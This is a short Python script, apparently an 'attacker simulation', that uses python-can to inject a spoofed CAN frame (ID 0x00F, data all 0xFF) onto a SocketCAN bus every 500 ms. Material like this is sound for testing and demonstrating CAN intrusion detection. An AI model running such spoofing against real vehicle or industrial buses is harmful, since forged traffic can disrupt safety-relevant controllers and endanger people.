import can
import time

# Configuration
CAN_INTERFACE = 'can0'
SPOOFED_ID = 0x00F  # The ID the attacker is spoofing
SPOOFED_DATA = [0xFF] * 8  # Spoofed message data (example: all 0xFF)

# Initialize CAN bus
bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='socketcan')

def send_spoofed_message():
    """Send a spoofed CAN message."""
    msg = can.Message(arbitration_id=SPOOFED_ID, data=SPOOFED_DATA, is_extended_id=False)
    try:
        bus.send(msg)
        print(f"Sent spoofed message with ID: {hex(SPOOFED_ID)}, Data: {SPOOFED_DATA}")
    except can.CanError:
        print("Failed to send spoofed message")

if __name__ == "__main__":
    try:
        print("Attacker simulation started")
        while True:
            send_spoofed_message()
            time.sleep(0.5)  # Send a spoofed message every 500ms (adjust as needed)
    except KeyboardInterrupt:
        print("Exiting attacker simulation...")
        bus.shutdown()
